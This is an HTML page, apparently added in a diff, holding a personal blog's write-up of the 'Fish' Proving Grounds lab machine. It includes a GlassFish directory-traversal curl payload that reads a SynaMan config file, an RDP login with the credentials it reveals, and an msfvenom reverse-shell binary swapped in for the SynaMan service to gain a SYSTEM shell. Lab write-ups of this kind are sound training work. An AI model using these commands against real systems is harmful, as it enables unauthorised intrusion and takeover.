@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Matthew Castro - Blog</title>
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
+        rel="stylesheet" type="text/css" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="../../css/styles.css" rel="stylesheet" />
+    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
+    <link rel="preload" as="image" href="/assets/img/posts.jpg">
+</head>
+
+<body>
+    <!-- Navigation-->
+    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+        <div class="container px-4 px-lg-5">
+            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
+                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                Menu
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarResponsive">
+                <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Page Header-->
+    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
+        <div class="container position-relative px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <div class="post-heading">
+                        <h2>Fish - Proving Grounds Write-up</h2>
+                        <span class="meta">
+                            Posted on January 19th, 2026
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Post Content-->
+    <article class="mb-4">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <p>We start by enumerating the machine with Nmap and visiting all identified web ports that are open using our browser. 
+                        We find the GlassFish admin console on port 4848 and a SynaMan instance on port 6060.
+                    </p>
+                    We discover a directory traversal vulnerability for GlassFish with searchsploit (EDB-ID 39441) and use it to read the
+                     configuration file of the SynaMan service.
+                    <p></p>
+                    <span class="grey-line">curl http://192.168.245.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afsynaman/config/appconfig.xml </span>
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/1.png" alt="..." />
+                    <p></p>
+                        We then use the credentials found to log in via RDP to the machine.
+                    <p></p>
+                    <span class="grey-line">xfreerdp3 /u:arthur /p:KingOfAtlantis /v:192.168.245.168 /dynamic-resolution </span>
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/2.png" alt="..." />
+                    <p></p>
+                    We identify a privilege escalation vulnerability in the SynaMan service (CVE-2022-26250). There was no POC that I could find associated with the vulnerability so I decided to enumerate further and see if I could get something to work.
+                    <p></p>
+                    We check the file permissions in the C:\SynaMan directory and notice that we can modify the SynaMan executable. We cannot start or stop the service and we cannot rename its executable while it is running. 
+                    The service is also set to start automatically.  
+                    <p></p>
+                    We delete all the files we can in the installation directory and restart the computer. This will prevent the service from starting as 
+                    soon as the computer boots. This allows us to rename the real binary and replace it with a malicious one. We restart the computer and obtain a 
+                    SYSTEM shell on our listener once the service starts. This method was not the cleanest but it was the quickest and easiest way I thought of to 
+                    replace the binary. In a real-world assessment, it would be best to set some sort of task or script to rename the binary as soon as the computer boots.
+                    <p></p>
+                    <span class="grey-line">icacls.exe .</span>
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/3.png" alt="..." />
+                    <p></p>
+                    <span class="grey-line">sc.exe qc synaman</span>
+                    <p></p>
+                    <span class="grey-line">net stop synaman</span>
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/4.png" alt="..." />
+                    <p></p>
+                    What the directory looks like once I delete all the files I can:
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/5.png" alt="..." />
+                    <p></p>
+                    <span class="grey-line">shutdown /r</span>
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/6.png" alt="..." />
+                    <p></p>
+                    <span class="grey-line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=8000 EXITFUNC=thread -f exe --platform windows -o SynaMan.exe</span>
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/7.png" alt="..." />
+                    <p></p>
+                    After waiting a bit and reconnecting via RDP, we are able to replace the binary with our payload.
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/8.png" alt="..." />
+                    <p></p>
+                    We restart the machine once again and receive a connection on our listener. We now have a reverse shell as SYSTEM.
+                    <p></p>
+                    <img class="img-fluid" src="../../assets/img/writeups/fish/9.png" alt="..." />
+
+                </div>
+            </div>
+        </div>
+    </article>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+</body>
+
+</html>
